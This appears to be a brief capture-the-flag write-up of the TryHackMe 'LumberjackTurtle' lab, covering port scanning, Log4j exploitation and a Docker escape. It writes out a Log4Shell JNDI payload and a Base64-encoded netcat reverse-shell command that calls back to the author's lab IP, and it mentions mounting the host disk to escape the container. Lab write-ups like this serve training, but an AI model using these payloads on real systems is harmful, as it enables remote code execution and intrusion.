>## THM LumberjackTurtle
## IP:10.10.204.88

# Enumeration

## Nmap

```
PORT   STATE SERVICE     VERSION
22/tcp open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6a:a1:2d:13:6c:8f:3a:2d:e3:ed:84:f4:c7:bf:20:32 (RSA)
|   256 1d:ac:5b:d6:7c:0c:7b:5b:d4:fe:e8:fc:a1:6a:df:7a (ECDSA)
|_  256 13:ee:51:78:41:7e:3f:54:3b:9a:24:9b:06:e2:d5:14 (ED25519)
80/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

```

We see that we have 2 open ports 

80, 22


## Port 80

![1](https://user-images.githubusercontent.com/74853138/150634332-c034f5c8-9c3b-4fb6-b07a-8c8fa109d603.png)

Error

![2](https://user-images.githubusercontent.com/74853138/150634347-658e7c6d-9f1e-40d0-aa53-31198ae2396c.png)

## Log4j Detection
we will use this as payload

```
 ${jndi:ldap://10.18.0.53:4444}

```

![3](https://user-images.githubusercontent.com/74853138/150634483-325aeda2-6e82-4131-b6f5-2d5a8debee58.png)


so we have here a log4j vulnerabilty 

let's try get shell

## Shell


```
${jndi:ldap://$IP:1389/Basic/Command/Base64/cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjE4LjAuNTMgNDQ0NCAgPi90bXAvZg==}

```


![4](https://user-images.githubusercontent.com/74853138/150634610-db5937f9-f139-41ce-94dc-29bc593582c9.png)


## User Flag.

```
user flag found in /opt/.flag1

```

## Docker escape and privilege.

```
we will mount dev/xvda in tmp 


Fun flag 
```
![5](https://user-images.githubusercontent.com/74853138/150634756-51c4c93a-d858-49ed-ab5f-6e79a4689a9d.png)

Let's try find the real flag

![6](https://user-images.githubusercontent.com/74853138/150634788-593858ac-a38d-4de6-8810-07996f067ace.png)

and voila got real root flag

![7](https://user-images.githubusercontent.com/74853138/150634802-98d3afcc-c14b-4653-a393-4e8edd3b40e7.png)

## Thanks for watching.
